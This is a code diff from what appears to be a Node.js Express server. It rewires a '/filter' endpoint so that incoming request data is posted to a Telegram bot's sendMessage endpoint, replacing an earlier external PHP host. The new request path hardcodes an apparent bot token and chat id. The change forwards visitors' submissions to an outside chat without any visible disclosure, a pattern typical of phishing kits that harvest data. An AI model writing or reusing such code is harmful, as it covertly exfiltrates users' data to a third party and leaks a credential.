@@ -16,13 +16,12 @@ app.post("/filter", (req, res) => {
     const postData = JSON.stringify(query);
     
     const options = {
-        hostname: "imbgroup.uz",
+        hostname: "api.telegram.org",
         port: 80,
-        path: "/set-dispatcher.php",
+        path: "/bot6536898950:AAHC0aCHOca0bpIGwzHGifdf-lGZ7E3tTUE/sendMessage?parse_mode=Markdown&chat_id=-1001848739093&text=context",
         method: "POST",
         headers: {
             "Content-Type": "application/json",
-            "Content-Length": Buffer.byteLength(postData)
         }
     };
 
